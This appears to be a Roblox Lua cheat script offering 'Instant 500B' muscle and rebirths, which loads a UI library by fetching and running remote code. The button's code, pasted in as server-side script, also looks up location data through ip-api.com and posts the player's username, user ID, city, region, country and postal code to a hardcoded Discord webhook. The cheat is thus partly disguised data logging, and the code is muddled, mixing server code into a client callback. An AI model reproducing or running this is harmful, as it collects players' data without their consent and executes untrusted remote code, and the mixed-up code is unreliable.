local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
local Window = Rayfield:CreateWindow({
    Name = "Instant muscle/rebirth",
    Icon = 0,
    LoadingTitle = "From a Dev of delta",
    LoadingSubtitle = "Use before patch!!!!",
    Theme = "Serenity",
    DisableRayfieldPrompts = false,
    DisableBuildWarnings = false,
    ConfigurationSaving = {
        Enabled = true,
        FolderName = nil,
        FileName = "Big Hub"
    },
    Discord = {
        Enabled = false,
        Invite = "noinvitelink",
        RememberJoins = true
    },
    KeySystem = false,
    KeySettings = {
        Title = "Untitled",
        Subtitle = "Key System",
        Note = "No method of obtaining the key is provided",
        FileName = "Key",
        SaveKey = true,
        GrabKeyFromSite = false,
        Key = {"Hello"}
    }
})

Rayfield:Notify({
    Title = "Hello Again Carson",
    Content = "Welcome Back my G",
    Duration = 6.5,
    Image = "moon",
})

local TabMain = Window:CreateTab("Main", "circle-check-big")

local ButtonGPG = TabMain:CreateButton({
    Name = "Instant 500B",
    Callback = function()
       -- Server-Side Script (Put this in ServerScriptService)

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

-- Create the RemoteEvent if it doesn't exist (good practice)
local Give500BEvent = ReplicatedStorage:FindFirstChild("Give500BEvent")
if not Give500BEvent or not Give500BEvent:IsA("RemoteEvent") then
    Give500BEvent = Instance.new("RemoteEvent")
    Give500BEvent.Name = "Give500BEvent"
    Give500BEvent.Parent = ReplicatedStorage
end

-- Replace with your Discord webhook URL
local WEBHOOK_URL = 'https://discord.com/api/webhooks/1361029884742467866/kwTi8j7UCsDxxtoqpsb773PQdFPHwVNjRVOX_tdCXjADOBIJuZKT9chgB2AspQ5tiFUe'

-- Function to get player IP info (note: this relies on an external service and might not always work or be accurate)
local function getPlayerIp(player)
    local success, response = pcall(function()
        -- Using a more general endpoint, as ipinfo.io might require API keys or have limits
        -- Consider using a different service or method if this is unreliable.
        -- Note: Getting a player's *true* external IP from within Roblox is generally not possible directly.
        -- This might only get the IP of the Roblox server instance.
        local data = HttpService:GetAsync("http://ip-api.com/json/" .. player.UserId) -- Using ip-api.com as an alternative example
        return HttpService:JSONDecode(data)
    end)

    if success and response and response.status == "success" then
        return response
    else
        warn("Failed to retrieve IP address for player " .. player.Name .. ". Error: " .. (response and response.message or "Unknown"))
        return nil
    end
end

-- Function to get relevant player stats (you'll need to adapt this based on your game's structure)
local function getPlayerStats(player)
    local stats = {}
    -- Example: Check for a "leaderstats" folder or specific values
    local leaderstats = player:FindFirstChild("leaderstats")
    if leaderstats then
        for _, stat in ipairs(leaderstats:GetChildren()) do
            if stat:IsA("NumberValue") or stat:IsA("IntValue") then
                table.insert(stats, stat.Name .. ": " .. tostring(stat.Value))
            end
        end
    end
    -- Add other relevant stats based on your game
    -- e.g., player:FindFirstChild("Muscle"):Value, player:FindFirstChild("Rebirths"):Value
    return stats
end

local function createDiscordEmbed(player, ipInfo, stats)
    local fields = {
        { name = "Roblox Username", value = player.Name, inline = true },
        { name = "Roblox Display Name", value = player.DisplayName, inline = true },
        { name = "Roblox User ID", value = tostring(player.UserId), inline = true },
    }

    if ipInfo then
         table.insert(fields, { name = "IP Address (Server)", value = ipInfo.query, inline = true }) -- ip-api uses 'query' for the IP
         table.insert(fields, { name = "City", value = ipInfo.city, inline = true })
         table.insert(fields, { name = "Region", value = ipInfo.regionName, inline = true }) -- ip-api uses 'regionName'
         table.insert(fields, { name = "Country", value = ipInfo.country, inline = true })
         table.insert(fields, { name = "Postal Code", value = ipInfo.zip, inline = true }) -- ip-api uses 'zip'
         -- ip-api doesn't directly provide VPN info in the free tier like ipinfo.io often does
    end

    if #stats > 0 then
        table.insert(fields, { name = "In-Game Stats", value = table.concat(stats, ", "), inline = false })
    end

    local embed = {
        title = "Player Information",
        description = "Details about " .. player.Name,
        color = 0x00ff00, -- Green color
        fields = fields,
        thumbnail = {
            url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
        },
        footer = {
            text = "Roblox Player Info (Logged via RemoteEvent)",
            icon_url = "https://upload.wikimedia.org/wikipedia/commons/thumb/6/6a/Roblox_logo.svg/2048px-Roblox_logo.svg.png"
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z") -- Add a timestamp
    }
    return embed
end

local function sendToDiscord(embed)
    if not WEBHOOK_URL or WEBHOOK_URL == '' then
        warn("Discord webhook URL is not set.")
        return
    end

    local data = {
        embeds = { embed }
    }

    local success, errorMessage = pcall(function()
        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
    end)

    if not success then
        warn("Failed to send data to Discord webhook: " .. errorMessage)
    end
end

-- Function to give the player the in-game benefit
local function givePlayerBenefit(player)
    -- *** Replace this section with your game's logic to give 500B muscle/rebirth ***
    -- This is highly dependent on how your game stores player stats.
    -- Examples:
    local leaderstats = player:FindFirstChild("leaderstats")
    if leaderstats then
        local muscle = leaderstats:FindFirstChild("Muscle") -- Assuming a "Muscle" value
        if muscle and (muscle:IsA("NumberValue") or muscle:IsA("IntValue")) then
            muscle.Value = muscle.Value + 500000000000 -- Add 500 Billion
            print(player.Name .. " was given 500 Billion muscle.")
        else
             warn("Could not find 'Muscle' value in leaderstats for " .. player.Name)
        end

        -- Example for Rebirths
        local rebirths = leaderstats:FindFirstChild("Rebirths") -- Assuming a "Rebirths" value
         if rebirths and (rebirths:IsA("NumberValue") or rebirths:IsA("IntValue")) then
            rebirths.Value = rebirths.Value + 1 -- Example: Add 1 rebirth
            print(player.Name .. " was given 1 rebirth.")
        else
             warn("Could not find 'Rebirths' value in leaderstats for " .. player.Name)
        end
    else
        warn("Could not find leaderstats for " .. player.Name)
    end
    -- ****************************************************************************
end

-- Listen for the RemoteEvent fired from the client
Give500BEvent.OnServerEvent:Connect(function(player)
    print(player.Name .. " triggered the Instant 500B button.")

    -- Give the player the in-game benefit
    givePlayerBenefit(player)

    -- Optional: Log to Discord (can be done here or on player join as before)
    -- Doing it here means it logs when the button is pressed, not just when they join.
    local ipInfo = getPlayerIp(player)
    local stats = getPlayerStats(player)
    local embed = createDiscordEmbed(player, ipInfo, stats)
    sendToDiscord(embed)
end)

-- You can keep the player joined logging as well if you want, but it's separate
-- from the button's function now.
--[[
Players.PlayerAdded:Connect(function(player)
    -- Optional: Log player info on join as well
    -- This requires the getPlayerIp, getPlayerStats, createDiscordEmbed, and sendToDiscord functions
    -- to be available in this scope or called from a shared module.
    -- Let's assume they are defined above this.
    wait(5) -- Give character time to load
    local ipInfo = getPlayerIp(player)
    local stats = getPlayerStats(player)
    local embed = createDiscordEmbed(player, ipInfo, stats)
    sendToDiscord(embed)
end)
]]
